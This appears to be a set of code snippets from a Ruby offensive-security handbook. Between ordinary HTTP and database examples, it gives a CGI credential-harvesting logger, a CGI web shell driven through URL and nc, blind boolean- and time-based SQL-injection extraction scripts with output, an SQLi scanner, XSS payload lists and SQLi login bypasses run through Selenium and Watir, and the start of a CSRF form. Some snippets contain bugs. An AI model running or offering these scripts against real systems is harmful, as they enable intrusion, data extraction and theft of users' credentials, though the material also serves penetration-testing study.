["```\n#!/usr/bin/env ruby\n# KING SABRI\n# Usage | ruby send_get.rb [HOST] [SESSION_ID]\n#\nrequire \"net/http\"\n\nhost       = ARGV[0] || \"172.16.50.139\"\nsession_id = ARGV[1] || \"3c0e9a7edfa6682cb891f1c3df8a33ad\"\n\ndef send_sqli(query)\n\n  uri = URI.parse(\"https://#{host}/script/path/file.php?\")\n  uri.query = URI.encode_www_form({\"var1\"=> \"val1\",\n                                   \"var2\"=> \"val2\",\n                                   \"var3\"=> \"val3\"})\n\n  http = Net::HTTP.new(uri.host, uri.port)\n  http.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS\n\n  request = Net::HTTP::Get.new(uri.request_uri)\n  request[\"User-Agent\"] = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0\"\n  request[\"Connection\"] = \"keep-alive\"\n  request[\"Accept-Language\"] = \"en-US,en;q=0.5\"\n  request[\"Accept-Encoding\"] = \"gzip, deflate\"\n  request[\"Accept\"] = \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"\n  request[\"PHPSESSID\"] = session_id\n\n  begin\n    puts \"Sending.. \"\n    response = http.request(request).body\n  rescue Exception => e\n    puts \"[!] Failed!\"\n    puts e\n  end\n\nend \n```", "```\n#!/usr/bin/env ruby\nrequire 'net/http'\nuri = ARGV[0]\nloop do\n  puts uri\n  res = Net::HTTP.get_response URI uri\n  if !res['location'].nil?\n    uri = res['location']\n  else\n    break\n  end\nend \n```", "```\n$ruby redirect.rb http://bit.ly/1JSs7vj\nhttp://bit.ly/1JSs7vj\nhttp://ow.ly/XLGfi\nhttps://tinyurl.com/hg69vgm\nhttp://rubyfu.net \n```", "```\n#!/usr/bin/env ruby\nrequire 'open-uri'\nrequire 'openssl'\n\nhost       = ARGV[0] || \"172.16.50.139\"\nsession_id = ARGV[1] || \"3c0e9a7edfa6682cb891f1c3df8a33ad\"\n\ndef send_sqli\n  uri = URI.parse(\"https://#{host}/script/path/file.php?var1=val1&var2=val2&var3=val3\")\n  headers =\n      {\n        \"User-Agent\" => \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0\",\n        \"Connection\" => \"keep-alive\",\n        \"Accept-Language\" => \"en-US,en;q=0.5\",\n        \"Accept-Encoding\" => \"gzip, deflate\",\n        \"Accept\" => \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n        \"Cookie\" => \"PHPSESSID=#{session_id}\"\n      }\n  request = open(uri, :ssl_verify_mode => OpenSSL::SSL::VERIFY_NONE, headers)\n  puts \"Sending.. \"\n  response = request.read\n  puts response\nend \n```", "```\nrequire 'net/http'\n\nuri = URI.parse \"http://example.com/Pages/PostPage.aspx\"\nheaders =\n{\n   'Referer' => 'http://example.com/Pages/SomePage.aspx',\n   'Cookie' => 'TS9e4B=ae79efe; WSS_FullScrende=false; ASP.NET_SessionId=rxuvh3l5dam',\n   'Connection' => 'keep-alive',\n   'Content-Type' =>'application/x-www-form-urlencoded'\n }\npost = File.read post_file   # Raw Post Body's Data\nhttp    = Net::HTTP.new(uri.host, uri.port)\nhttp.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS\nrequest = Net::HTTP::Post.new(uri.path, headers)\nrequest.body = post\nresponse = http.request request\nputs response.code\nputs response.body \n```", "```\n<FORM METHOD=POST ACTION=\"http://wwwx.cs.unc.edu/~jbs/aw-wwwp/docs/resources/perl/perl-cgi/programs/cgi_stdin.cgi\">\n\n    <P>Name field: <INPUT TYPE=\"text\" Name=\"name\" SIZE=30 VALUE = \"You name\">\n    <P>Name field: <TEXTAREA TYPE=\"textarea\" ROWS=5 COLS=30 Name=\"textarea\">Your comment.</TEXTAREA>\n\n    <P>Your age: <INPUT TYPE=\"radio\" NAME=\"radiobutton\" VALUE=\"youngun\"> younger than 21,\n    <INPUT TYPE=\"radio\" NAME=\"radiobutton\" VALUE=\"middleun\" CHECKED> 21 -59,\n    <INPUT TYPE=\"radio\" NAME=\"radiobutton\" VALUE=\"oldun\"> 60 or older\n\n    <P>Things you like:\n    <INPUT TYPE=\"checkbox\" NAME=\"checkedbox\" VALUE=\"pizza\" CHECKED>pizza,\n    <INPUT TYPE=\"checkbox\" NAME=\"checkedbox\" VALUE=\"hamburgers\" CHECKED>hamburgers,\n    <INPUT TYPE=\"checkbox\" NAME=\"checkedbox\" VALUE=\"spinich\">spinich,\n    <INPUT TYPE=\"checkbox\" NAME=\"checkedbox\" VALUE=\"mashed potatoes\" CHECKED>mashed potatoes\n\n    <P>What you like most:\n    <SELECT NAME=\"selectitem\">\n        <OPTION>pizza<OPTION>hamburgers<OPTION SELECTED>spinich<OPTION>mashed potatoes<OPTION>other\n    </SELECT>\n\n    <P>Reset: <INPUT TYPE=\"reset\" >\n\n    <P>Submit: <INPUT TYPE=\"submit\" NAME=\"submitbutton\" VALUE=\"Do it!\" ACTION=\"SEND\">\n</FORM> \n```", "```\nrequire \"net/http\"\nrequire \"uri\"\n\n# Parsing the URL and instantiate http\nuri = URI.parse(\"http://wwwx.cs.unc.edu/~jbs/aw-wwwp/docs/resources/perl/perl-cgi/programs/cgi_stdin.cgi\")\nhttp = Net::HTTP.new(uri.host, uri.port)\nhttp.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS\n\n# Instantiate HTTP Post request\nrequest = Net::HTTP::Post.new(uri.request_uri)\n\n# Headers\nrequest[\"Accept\"] = \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"\nrequest[\"User-Agent\"] = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0\"\nrequest[\"Referer\"] = \"http://www.cs.unc.edu/~jbs/resources/perl/perl-cgi/programs/form1-POST.html\"\nrequest[\"Connection\"] = \"keep-alive\"\nrequest[\"Accept-Language\"] = \"en-US,en;q=0.5\"\nrequest[\"Accept-Encoding\"] = \"gzip, deflate\"\nrequest[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\n\n# Post body\nrequest.set_form_data({\n                          \"name\"         => \"My title is here\",\n                          \"textarea\"     => \"My grate message here.\",\n                          \"radiobutton\"  => \"middleun\",\n                          \"checkedbox\"   => \"pizza\",\n                          \"checkedbox\"   => \"hamburgers\",\n                          \"checkedbox\"   => \"mashed potatoes\",\n                          \"selectitem\"   => \"hamburgers\",\n                          \"submitbutton\" => \"Do it!\"\n                      })\n\n# Receive the response\nresponse = http.request(request)\n\nputs \"Status code: \" + response.code\nputs \"Response body: \" + response.body \n```", "```\nrequest.body = \"name=My title is here&textarea=My grate message here.&radiobutton=middleun&checkedbox=pizza&checkedboxhamburgers&checkedbox=mashed potatoes&selectitem=hamburgers&submitbutton=Do it!\" \n```", "```\nputs \"[*] Logging-in\"\nuri1 = URI.parse(\"http://host/login.aspx\")\nuri2 = URI.parse(\"http://host/report.aspx\")\n\nNet::HTTP.start(uri1.host, uri1.port) do |http|\n  http.use_ssl = true if uri1.scheme == 'https'    # Enable HTTPS support if it's HTTPS\n  puts \"[*] Logging in\"\n  p_request  = Net::HTTP::Post.new(uri1)\n  p_request.set_form_data({\"loginName\"=>\"admin\", \"password\"=>\"P@ssw0rd\"})\n  p_response = http.request(p_request)\n  cookies    = p_response.response['set-cookie']    # Save Cookies\n\n  puts \"[*] Do Post-authentication actions\"\n  Net::HTTP::Get.new(uri2)\n  g_request  = Net::HTTP::Get.new(uri2)\n  g_request['Cookie'] = cookies                     # Restore Saved Cookies\n  g_response = http.request(g_request)\nend \n```", "```\nrequire 'net/http'\n\nusername = \"Admin\"\npassword = \"P@ssw0rd\"\nuri      = URI(\"http://rubyfu.net/login\")\n\nhttp = http = Net::HTTP.new(uri.host, uri.port)\nreq  = Net::HTTP::Get.new(uri)\nreq.basic_auth usernamen, password\nres  = http.request(request)\n\nputs res.body \n```", "```\n    gem install net-http-digest_auth \n    ```", "```\nrequire 'ntlm/http'\nrequire 'net/http/digest_auth'\n\nuri          = URI(\"http://rubyfu.net/login\")\nuri.user     = \"Admin\"\nuri.password = \"P@ssw0rd\"\n\nhttp = Net::HTTP.new(uri.host, uri.port)\ndigest_auth = Net::HTTP::DigestAuth.new\nreq  = Net::HTTP::Get.new(uri)\nauth = digest_auth.auth_header uri, res['www-authenticate'], 'GET'\nreq.add_field 'Authorization', auth\nres  = http.request(request)\n\nputs res.body \n```", "```\n    gem install ruby-ntlm \n    ```", "```\nrequire 'ntlm/http'\n\nusername = \"Admin\"\npassword = \"P@ssw0rd\"\nuri      = URI(\"http://rubyfu.net/login\")\n\nhttp = http = Net::HTTP.new(uri.host, uri.port)\nreq  = Net::HTTP::Get.new(uri)\nreq.ntlm_auth usernamen, password\nres  = http.request(request)\n\nputs res.body \n```", "```\n<Directory /var/www/[CGI FOLDER]>\n        AddHandler cgi-script .rb\n        Options +ExecCGI\n</Directory> \n```", "```\n#!/usr/bin/ruby\n# CGI script gets user/pass | http://attacker/info.rb?user=USER&pass=PASS\nrequire 'cgi'\nrequire 'uri'\n\ncgi  = CGI.new\ncgi.header  # content type 'text/html'\nuser = URI.encode cgi['user']\npass = URI.encode cgi['pass']\ntime = Time.now.strftime(\"%D %T\")\n\nfile = 'hacked_login.txt'\nFile.open(file, \"a\") do |f|\n  f.puts time   # Time of receiving the get request\n  f.puts \"#{URI.decode user}:#{URI.decode pass}\"    # The data\n  f.puts cgi.remote_addr    # Remote user IP\n  f.puts cgi.referer    # The vulnerable site URL\n  f.puts \"---------------------------\"\nend\nFile.chmod(0200, file)  # To prevent public access to the log file\n\nputs \"\" \n```", "```\n#!/usr/bin/env ruby\nrequire 'cgi'\ncgi = CGI.new\nputs cgi.header\nsystem(cgi['cmd']) \n```", "```\nhttp://host/cgi/shell.rb?cmd=ls -la \n```", "```\necho \"GET /cgi/shell.rb?cmd=ls%20-la\" | nc host 80 \n```", "```\nruby wsc.rb \n```", "```\nShell -> set http://host/cgi/shell.rb?cmd= \n```", "```\nShell -> ls -la \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n# Send your payload from command line\n#\nrequire \"net/http\"\n\nif ARGV.size < 2\n  puts \"[+] ruby #{__FILE__} [IP ADDRESS] [PAYLOAD]\"\n  exit 0\nelse\n  host, payload = ARGV\nend\n\nuri = URI.parse(\"http://#{host}/artists.php?\")\nuri.query = URI.encode_www_form({\"artist\" => \"#{payload}\"})\nhttp = Net::HTTP.new(uri.host, uri.port)\nhttp.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS\n# http.set_debug_output($stdout)\n\nrequest = Net::HTTP::Get.new(uri.request_uri)\nresponse = http.request(request)\n# puts \"[+] Status code: \"+ response.code + \"\\n\\n\"\n# puts response.body.gsub(/<.*?>/, '').strip\nputs response.body.scan(/<h2 id='pageName'>.*<\\/h2>/).join.gsub(/<.*?>/, '').strip\n\nputs \"\" \n```", "```\nruby sqli-basic.rb \"testphp.vulnweb.com\" \"-1 UNION ALL SELECT NULL,NULL,NULL,NULL#\" | grep -i -e warning -e error\n# => Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62\n\nruby sqli-basic.rb \"testphp.vulnweb.com\" \"-1 UNION ALL SELECT NULL,NULL,NULL#\" | grep -i -e warning -e error\n# => \n\nruby sqli-basic.rb \"testphp.vulnweb.com\" \"-1 UNION ALL SELECT NULL,@@VERSION,NULL#\"\n# => artist: 5.1.73-0ubuntu0.10.04.1\n\nruby sqli-basic.rb \"testphp.vulnweb.com\" \"-1 UNION ALL SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables#\" \n# => artist: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVIL \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n# Very basic SQLi scanner!\n#\nrequire 'net/http'\n\n# Some SQLi payloads\npayloads =\n    [\n      \"'\",\n      '\"',\n      \"' or 1=2--+\"\n    ]\n\n# Some database error responses\nerrors =\n    {\n      :mysql => [\n                 \"SQL.*syntax\",\n                 \"mysql.*(fetch).*array\",\n                 \"Warning\"\n                ],\n      :mssql => [\n                 \"line.*[0-9]\",\n                 \"Microsoft SQL Native Client error.*\"\n                ],\n      :oracle => [\n                  \".*ORA-[0-9].*\",\n                  \"Warning\"\n                 ]\n      }\n\n# Try a known vulnerable site\nuri  = URI.parse \"http://testphp.vulnweb.com/artists.php?artist=1\"\n\n# Update the query with a payload\nuri.query += payloads[0]\n\n# Send get request\nresponse = Net::HTTP.get uri\n\n# Search if an error occurred = vulnerable\nputs \"[+] The #{URL.decode(uri.to_s)} is vulnerable!\" unless response.match(/#{errors[:mysql][0]}/i).nil? \n```", "```\nruby sqli.rb http://testasp.vulnweb.com/showforum.asp?id=0\n[+] The http://testphp.vulnweb.com/artists.php?artist=1' is vulnerable! \n```", "```\n#!/usr/bin/env ruby\n# Boolean-based SQLi exploit\n# Sabri Saleh | @KINGSABRI\n#\nrequire 'open-uri'\n\nif ARGV.size < 1\n  puts \"[+] ruby #{__FILE__} <IP ADDRESS>\"\n  exit 0\nelse\n  host = ARGV[0]\nend\n\n# Just colorizing outputs\nclass String\n  def red; colorize(self, \"\\e[1m\\e[31m\"); end\n  def green; colorize(self, \"\\e[1m\\e[32m\"); end\n  def bold; colorize(self, \"\\e[1m\"); end\n  def colorize(text, color_code)  \"#{color_code}#{text}\\e[0m\" end\nend\n\n# SQL injection\ndef send_bbsqli(url, query)\n  begin\n\n    response = open(URI.parse( URI.encode(\"#{url}#{query}\") ))\n\n    if !response.read.scan(\"You are in...........\").empty?\n      return 1 # TRUE\n    end\n\n  rescue Exception => e\n    puts \"[!] Failed to SQL inject #{e}\".red \n    exit 0\n  end\nend\n\nurl = \"http://#{host}/sqli-labs/Less-8/index.php?id=\"\n\nputs \"[*] Start Sending Boolean-based SQLi\".bold\n\nextracted = []\n(1..100).map do |position|\n  (32..126).map do |char|\n     puts \"[*] Brute-forcing on Position: \".bold + \"#{position}\".green + \" | \".bold + \"Character: \".bold + \"#{char} = #{char.chr}\".green\n\n     # Put your query here \n#      query = \"1' AND (ASCII(SUBSTR((SELECT DATABASE()),#{position},1)))=#{char}--+\"\n     query = \"1' AND (ASCII(SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),#{position},1)))=#{char}--+\"\n     result = send_bbsqli(url, query)\n         if result.eql? 1\n           puts \"[+] Found character: \".bold + \"#{char.to_s(16)} hex\".green\n\n           extracted <<  char.chr\n           puts \"[+] Extracted characters: \".bold + \"#{extracted.join}\".green\n           break \n         end\n   end\nend\n\nputs \"\\n\\n[+] Final found string: \".bold + \"#{extracted.join}\".green \n```", "```\n#!/usr/bin/env ruby\n# Boolean-based SQLi exploit\n# Sabri Saleh | @KINGSABRI\n#\nrequire 'open-uri'\n\nif ARGV.size < 1\n  puts \"[+] ruby #{__FILE__} <IP ADDRESS>\"\n  exit 0\nelse\n  host = ARGV[0]\nend\n\n# Just colorizing outputs\nclass String\n  def red; colorize(self, \"\\e[1m\\e[31m\"); end\n  def green; colorize(self, \"\\e[1m\\e[32m\"); end\n  def bold; colorize(self, \"\\e[1m\"); end\n  def colorize(text, color_code)  \"#{color_code}#{text}\\e[0m\" end\nend\n\n# SQL injection\ndef send_tbsqli(url, query, time2wait)\n  begin\n    start_time = Time.now\n    response = open(URI.parse( URI.encode(\"#{url}#{query}\") ))\n    end_time   = Time.now\n    howlong    = end_time - start_time\n\n    if howlong >= time2wait\n      return 1 # TRUE\n    end\n\n  rescue Exception => e\n    puts \"[!] Failed to SQL inject #{e}\".red \n    exit 0\n  end\nend\n\nurl = \"http://#{host}/sqli-labs/Less-10/index.php?id=\"\n\nputs \"[*] Start Sending Boolean-based SQLi\".bold\ntime2wait = 5\nextracted = []\n(1..76).map do |position| \n  (32..126).map do |char|\n     puts \"[*] Brute-forcing on Position: \".bold + \"#{position}\".green + \" | \".bold + \"Character: \".bold + \"#{char} = #{char.chr}\".green\n\n     # Put your query here \n     query = \"1\\\" AND IF((ASCII(SUBSTR((SELECT DATABASE()),#{position},1)))=#{char}, SLEEP(#{time2wait}), NULL)--+\"\n\n     result = send_tbsqli(url, query, time2wait)\n         if result.eql? 1\n           puts \"[+] Found character: \".bold + \"#{char.to_s(16)} hex\".green\n\n           extracted <<  char.chr\n           puts \"[+] Extracted characters: \".bold + \"#{extracted.join}\".green\n           break \n         end\n   end\nend\n\nputs \"\\n\\n[+] Final found string: \".bold + \"#{extracted.join}\".green \n```", "```\n    gem install sqlite3 \n    ```", "```\n    apt-get install libsqlite3-dev \n    ```", "```\nrequire \"sqlite3\"\n\n# Open/Create a database\ndb = SQLite3::Database.new \"rubyfu.db\"\n\n# Create a table\nrows = db.execute <<-SQL\n  CREATE TABLE attackers (\n   id   INTEGER PRIMARY KEY   AUTOINCREMENT,\n   name TEXT    NOT NULL,\n   ip   CHAR(50)\n);\nSQL\n\n# Execute a few inserts\n{\n  'Anonymous'    => \"192.168.0.7\",\n  'LulzSec'      => \"192.168.0.14\",\n  'Lizard Squad' => \"192.168.0.253\"\n}.each do |attacker, ip|\n  db.execute(\"INSERT INTO attackers (name, ip)\n              VALUES (?, ?)\", [attacker, ip])\nend\n\n# Find a few rows\ndb.execute \"SELECT id,name,ip FROM attackers\"\n\n# List all tables\ndb.execute  \"SELECT * FROM sqlite_master where type='table'\" \n```", "```\n    gem install activerecord \n    ```", "```\n    gem install mysql \n    ```", "```\ncreate database rubyfu_db;\n\ngrant all on rubyfu_db.* to 'root'@'localhost';\n\ncreate table attackers (\n  id int not null auto_increment,\n  name varchar(100) not null,\n  ip text not null,\n  primary key (id)\n);\n\nexit \n```", "```\nmysql -u root -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 41\nServer version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)\n\nCopyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> create database rubyfu_db;\nQuery OK, 1 row affected (0.00 sec)\n\nmysql> grant all on rubyfu_db.* to 'root'@'localhost';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> use rubyfu_db;\nDatabase changed\nmysql> create table attackers (\n    ->   id int not null auto_increment,\n    ->   name varchar(100) not null,\n    ->   ip text not null,\n    ->   primary key (id)\n    -> );\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> exit \n```", "```\nrequire 'active_record'\nActiveRecord::Base.establish_connection(\n:adapter  => \"mysql\",\n:username => \"root\",\n:password => \"root\",\n:host     => \"localhost\",\n:database => \"rubyfu_db\"\n)\n\nclass Attackers < ActiveRecord::Base\nend \n```", "```\nAttackers.create(:name => 'Anonymous',    :ip => \"192.168.0.7\")\nAttackers.create(:name => 'LulzSec',      :ip => \"192.168.0.14\")\nAttackers.create(:name => 'Lizard Squad', :ip => \"192.168.0.253\") \n```", "```\n    Attackers.find(1) \n    ```", "```\n    Attackers.find_by(name: \"Anonymous\") \n    ```", "```\n    #<Attackers:0x000000010a6ad0 id: 1, name: \"Anonymous\", ip: \"192.168.0.7\"> \n    ```", "```\nattacker = Attackers.find(3)\nattacker.id\nattacker.name\nattacker.ip \n```", "```\nAttackers.find(2).destroy \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n# ActiveRecord with MySQL\n#\nrequire 'active_record'\n\n# Connect to database\nActiveRecord::Base.establish_connection(\n                                        :adapter  => \"mysql\",\n                                        :username => \"root\",\n                                        :password => \"root\",\n                                        :host     => \"localhost\",\n                                        :database => \"rubyfu_db\"\n                                       )\n\n# Create Active Record Model for the table\nclass Attackers < ActiveRecord::Base\nend\n\n# Create New Entries to the table\nAttackers.create(:name => 'Anonymous',    :ip => \"192.168.0.7\")\nAttackers.create(:name => 'LulzSec',      :ip => \"192.168.0.14\")\nAttackers.create(:name => 'Lizard Squad', :ip => \"192.168.0.253\")\n\n# Interact with table items\nattacker = Attackers.find(3)\nattacker.id\nattacker.name\nattacker.ip\n\n# Delete a table Item\nAttackers.find(2).destroy \n```", "```\nunzip -qq instantclient-basic-linux.x64-12.1.0.2.0.zip\nunzip -qq instantclient-sdk-linux.x64-12.1.0.2.0.zip\nunzip -qq instantclient-sqlplus-linux.x64-12.1.0.2.0.zip \n```", "```\nmkdir -p /usr/local/oracle/{network,product/instantclient_64/12.1.0.2.0/{bin,lib,jdbc/lib,rdbms/jlib,sqlplus/admin/}} \n```", "```\n/usr/local/oracle/\n\u251c\u2500\u2500 admin\n\u2502   \u2514\u2500\u2500 network\n\u2514\u2500\u2500 product\n    \u2514\u2500\u2500 instantclient_64\n        \u2514\u2500\u2500 12.1.0.2.0\n            \u251c\u2500\u2500 bin\n            \u251c\u2500\u2500 jdbc\n            \u2502   \u2514\u2500\u2500 lib\n            \u251c\u2500\u2500 lib\n            \u251c\u2500\u2500 rdbms\n            \u2502   \u2514\u2500\u2500 jlib\n            \u2514\u2500\u2500 sqlplus\n                \u2514\u2500\u2500 admin \n```", "```\ncd instantclient_12_1\n\nmv ojdbc* /usr/local/oracle/product/instantclient_64/12.1.0.2.0/jdbc/lib/\nmv x*.jar /usr/local/oracle/product/instantclient_64/12.1.0.2.0/rdbms/jlib/\n# rename glogin.sql to login.sql\nmv glogin.sql /usr/local/oracle/product/instantclient_64/12.1.0.2.0/sqlplus/admin/login.sql\nmv sdk /usr/local/oracle/product/instantclient_64/12.1.0.2.0/lib/\nmv *README /usr/local/oracle/product/instantclient_64/12.1.0.2.0/\nmv * /usr/local/oracle/product/instantclient_64/12.1.0.2.0/bin/\n# Symlink of instantclient\ncd /usr/local/oracle/product/instantclient_64/12.1.0.2.0/bin\nln -s libclntsh.so.12.1 libclntsh.so\nln -s ../lib/sdk sdk\ncd - \n```", "```\n# Oracle Environment\nexport ORACLE_BASE=/usr/local/oracle\nexport ORACLE_HOME=$ORACLE_BASE/product/instantclient_64/12.1.0.2.0\nexport PATH=$ORACLE_HOME/bin:$PATH\nLD_LIBRARY_PATH=$ORACLE_HOME/bin\nexport LD_LIBRARY_PATH\nexport TNS_ADMIN=$ORACLE_BASE/admin/network\nexport SQLPATH=$ORACLE_HOME/sqlplus/admin \n```", "```\nsource ~/.bashrc \n```", "```\n    gem install ruby-oci8 activerecord-oracle_enhanced-adapter \n    ```", "```\nrequire 'active_record'\n\nActiveRecord::Base.establish_connection(\n                      :adapter  => \"oracle_enhanced\",\n                      :database => \"192.168.0.13:1521/XE\",\n                      :username => \"SYSDBA\",\n                      :password => \"welcome1\"\n                       )\n\nclass DBAUsers < ActiveRecord::Base\nend \n```", "```\ngem install tiny_tds activerecord-sqlserver-adapter \n```", "```\nrequire 'java'\njava_import 'burp.IBurpExtender'\n\nclass BurpExtender\n  include IBurpExtender\n\n  def registerExtenderCallbacks(callbacks)\n    callbacks.setExtensionName(\"Rubyfu Alert!\")\n    callbacks.issueAlert(\"Alert: Ruby goes evil!\")\n  end\nend \n```", "```\n    gem install selenium-webdriver \n    ```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire \"selenium-webdriver\"\n\n# Profile Setup and Tweak\nproxy = Selenium::WebDriver::Proxy.new(\n  :http     => PROXY,\n  :ftp      => PROXY,\n  :ssl      => PROXY\n)       # Set Proxy hostname and port\nprofile = Selenium::WebDriver::Firefox::Profile.from_name \"default\"     # Use an existing profile name\nprofile['general.useragent.override'] = \"Mozilla/5.0 (compatible; MSIE 9.0; \" +\n                                        \"Windows Phone OS 7.5; Trident/5.0; \" +\n                                        \"IEMobile/9.0)\"                 # Set User Agent\nprofile.proxy = proxy                                                   # Set Proxy\nprofile.assume_untrusted_certificate_issuer = false                     # Accept untrusted SSL certificates\n\n# Start Driver\ndriver = Selenium::WebDriver.for(:firefox, :profile => profile)         # Start firefox driver with specified profile\n# driver = Selenium::WebDriver.for(:firefox, :profile => \"default\")     # Use this line if just need a current profile and no need to setup or tweak your profile\ndriver.manage.window.resize_to(500, 400)                                # Set Browser windows size\ndriver.navigate.to \"http://www.altoromutual.com/search.aspx?\"           # The URL to navigate\n\n# Interact with elements\nelement = driver.find_element(:name, 'txtSearch')   # Find an element named 'txtSearch'\nelement.send_keys \"<img src=x onerror='alert(1)'>\"  # Send your keys to element\nelement.send_keys(:control, 't')                    # Open a new tab\nelement.submit                                      # Submit the text you've just sent \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'selenium-webdriver'\n\nbrowser = Selenium::WebDriver.for :firefox\nbrowser.get \"http://www.altoromutual.com/bank/login.aspx\"\n\nwait = Selenium::WebDriver::Wait.new(:timeout => 15)        # Set waiting timeout\n# Find the input elements to interact with later.\ninput = wait.until {\n  element_user = browser.find_element(:name, \"uid\")\n  element_pass = browser.find_element(:name, \"passw\")\n  # Retrun array of elements when get displayed\n  [element_user, element_pass] if element_user.displayed? and element_pass.displayed?\n}\n\ninput[0].send_keys(\"' or 1=1;--\")   # Send key for the 1st element\ninput[1].send_keys(\"password\")      # Send key fro the next element\nsleep 1\n\n# Click/submit the button based the form it is in (you can also call 'btnSubmit' method)\nsubmit = browser.find_element(:name, \"btnSubmit\").click #.submit\n\n# browser.quit \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'selenium-webdriver'\n\npayloads =\n  [\n    \"<video src=x onerror=alert(1);>\",\n    \"<img src=x onerror='alert(2)'>\",\n    \"<script>alert(3)</script>\",\n    \"<svg/OnlOad=prompt(4)>\",\n    \"javascript:alert(5)\",\n    \"alert(/6/.source)\"\n  ]\n\nbrowser = Selenium::WebDriver.for :firefox                  # You can use :ff too\nbrowser.manage.window.resize_to(500, 400)                   # Set browser size\nbrowser.get \"http://www.altoromutual.com/search.aspx?\"\n\nwait = Selenium::WebDriver::Wait.new(:timeout => 10)        # Timeout to wait\n\npayloads.each do |payload|\n  input = wait.until do\n      element = browser.find_element(:name, 'txtSearch')\n      element if element.displayed?\n  end\n  input.send_keys(payload)\n  input.submit\n\n  begin\n    wait.until do\n      txt = browser.switch_to.alert\n      if (1..100) === txt.text.to_i\n        puts \"Payload is working: #{payload}\"\n        txt.accept\n      end\n    end\n  rescue Selenium::WebDriver::Error::NoAlertOpenError\n    puts \"False Positive: #{payload}\"\n    next\n  end\n\nend\n\nbrowser.close \n```", "```\n> ruby selenium-xss.rb\nPayload is working: <video src=x onerror=alert(1);>\nPayload is working: <img src=x onerror='alert(2)'>\nPayload is working: <script>alert(3)</script>\nPayload is working: <svg/OnlOad=prompt(4)>\nFalse Positive: javascript:alert(5)\nFalse Positive: alert(/6/.source) \n```", "```\n    gem install watir \n    ```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'watir'\n\nbrowser = Watir::Browser.new :firefox\nbrowser.goto \"http://www.altoromutual.com/search.aspx?\"\nbrowser.text_field(name: 'txtSearch').set(\"<img src=x onerror='alert(1)'>\")\nbtn = browser.button(value: 'Go')\nputs btn.exists?\nbtn.click\n\n# browser.close \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'watir'\n\nbrowser = Watir::Browser.new :firefox\nwait = Selenium::WebDriver::Wait.new(:timeout => 15)\n\nbegin\n    browser.goto(\"http://www.altoromutual.com/search.aspx?txtSearch=<img src=x onerror=alert(1)>\")\nrescue Selenium::WebDriver::Error::UnhandledAlertError\n    browser.refresh\n    wait.until {browser.alert.exists?}\nend\n\nif browser.alert.exists?\n  browser.alert.ok\n  puts \"[+] Exploit found!\"\n  browser.close\nend \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'watir'\n\nbrowser = Watir::Browser.new :firefox\nbrowser.window.resize_to(800, 600)\nbrowser.window.move_to(0, 0)\nbrowser.goto \"http://www.altoromutual.com/bank/login.aspx\"\nbrowser.text_field(name: 'uid').set(\"' or 1=1;-- \")\nbrowser.text_field(name: 'passw').set(\"password\")\nbtn = browser.button(name: 'btnSubmit').click\n\n# browser.close \n```", "```\nPOST /path/of/editfunction HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 100\nCookie: PHPSESSIONID=111111111111111111111\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\nfield1=\"\"&field2=\"\"&field3=\"\"&field4=\"\" \n```", "```\n<html>\n  <head>\n    <title>Victim Site - POST request</title>\n  </head>\n  <body>\n    <form action=\"https://example.com/path/of/editfunction\" method=\"POST\">\n      <input type=\"text\" name=\"field1\" value=\"\" />\n      <input type=\"text\" name=\"field2\" value=\"\" />\n      <input type=\"text\" name=\"field3\" value=\"\" />\n      <input type=\"text\" name=\"field4\" value=\"\" />\n      <p><input 